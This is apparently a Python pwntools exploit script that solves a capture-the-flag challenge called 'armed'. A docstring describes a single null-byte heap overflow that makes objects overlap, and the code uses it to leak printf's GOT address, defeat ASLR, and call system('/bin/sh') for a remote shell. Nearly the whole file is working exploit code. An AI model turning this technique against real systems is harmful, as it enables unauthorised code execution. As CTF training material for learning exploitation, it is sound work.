#!/usr/bin/env python2

"""Single null-byte buffer overflow in a heap object.

struct contact_t {
    function_ptr ptr;
    char name[100];
    info_t *info;
}

struct info_t {
    char address[80];
    char pad1[20];
    char number[80];
    char pad2[20];
}

These structures are allocated sequentially. The function to read in a buffer
of data has a single byte overflow when it null-terminates the string. When
reading the name, we can use this to corrupt the least significant byte of the
info pointer in contact_t. This will allow us to overlap the info structure
with the contact.

Since they're now overlapping, we can use the address field to set the function
pointer in the contact, and the number field to set the info pointer fully.
When the function pointer is invoked, it's called with (info + 100) (what would
normally be the &info.number field).

By setting the function pointer to puts and the info pointer to the address we
want to leak - 100, we can leak nearly all locations in memory. We use this to
leak the address of printf from the got to bypass ASLR.

However, we can't update this struct since the info pointer is now corrupted,
and there's no clean way to fix it up. Trying to remove the object will result
in free being called with an invalid pointer. We can however create more
contacts. If we keep doing this, we can get back to a state where our 1-byte
overflow will lead to overlapping objects. Note that depending on the state of
the heap, the allocations may not overlap even with the one-byte overflow and
we can't recreate our primitive. We can test this by filling all buffers with
a's, b's, and c's respectively, print the contact, and note when the name
field is overwritten by the b's specified in the address field. It turns out
after three additional allocations, the fourth will result in overlapping
buffers again.

Now that we're back in business, we can overwrite the function pointer with
system and the info pointer with "/bin/sh" in libc and win.
"""

from pwn import *

conn = remote("on.acictf.com", 34053)
#conn = remote("localhost", 4444)   # ssh remote tunnel to socat on rpi

#context.log_level = "debug"

elf = ELF("./armed")
libc = ELF("./libc.so.6")
#libc = ELF("./libc_pi.so.6")

# Test string to use for testing leak
TEST_STR = 0x10cd0   # "This will be used later"


def send_info(name, address, number):
    conn.recvuntil("name:")
    if len(name) < 100:
        conn.sendline(name)
    else:
        conn.send(name)

    conn.recvuntil("address:")
    if len(address) < 80:
        conn.sendline(address)
    else:
        conn.send(address)

    conn.recvuntil("number:")
    if len(number) < 80:
        conn.sendline(number)
    else:
        conn.send(number)


def create_contact(name, address, number):
    conn.sendline("1")
    send_info(name, address, number)
    conn.recvuntil(">")


def edit_contact(name, address, number):
    conn.sendline("2")
    send_info(name, address, number)
    conn.recvuntil(">")


def test_alloc_offset():
    """Used to test our allocations and ensure the heap is in a good
        state for our exploit primitive."""
    create_contact("a"*100, "b"*80, "c"*80)
    conn.sendline("5")
    conn.recvuntil(">")


def leak_mem(addr):
    """Leak an aribitrary address with puts()."""
    address = "b"*16 + p32(elf.symbols["puts"]) + "testname"
    number = "c"*20 + p32(addr - 100)
    create_contact("a"*100, address, number)

    conn.sendline("4")
    data = conn.recvuntil("Choose an option", drop=True)[:-1]
    conn.recvuntil(">")
    return data


def main():
    conn.recvuntil(">")

    # Leak the .got entry for printf IOT get libc base.
    leak = leak_mem(elf.got["printf"])
    printf_addr = u32(leak[:4])
    libc.address = printf_addr - libc.symbols["printf"]
    log.info("printf.got : 0x{:x}".format(printf_addr))
    log.info("libc base: 0x{:x}".format(libc.address))

    # Since we've corrupted our contact and can't quite recover or free
    # it, we need to get back to a good heap state. Allocate some
    # additional blocks so we can get back our original primitives.
    # The initial allocation must return a value with the same least
    # significant byte for our offsets to work. Use the
    # test_alloc_offset to figure out how many contacts to create.
    # You should get back 60 b's if the offsets are correct.
    log.info("Fixing heap state...")
    for _ in xrange(3):
        create_contact("", "", "")

    # Use the same primitive has the leak, except call system and
    # set the contact->info pointer to point to "/bin/sh" in libc.
    address = "b"*16 + p32(libc.symbols["system"]) + "testname"
    binsh_addr = next(libc.search("/bin/sh"))
    log.info("/bin/sh addr: 0x{:x}".format(binsh_addr))
    number = "c"*20 + p32(binsh_addr - 100)
    create_contact("a"*100, address, number)

    # Trigger the primitive for a shell
    log.info("Triggering system...")
    conn.sendline("4")
    conn.interactive()


if __name__ == "__main__":
    main()
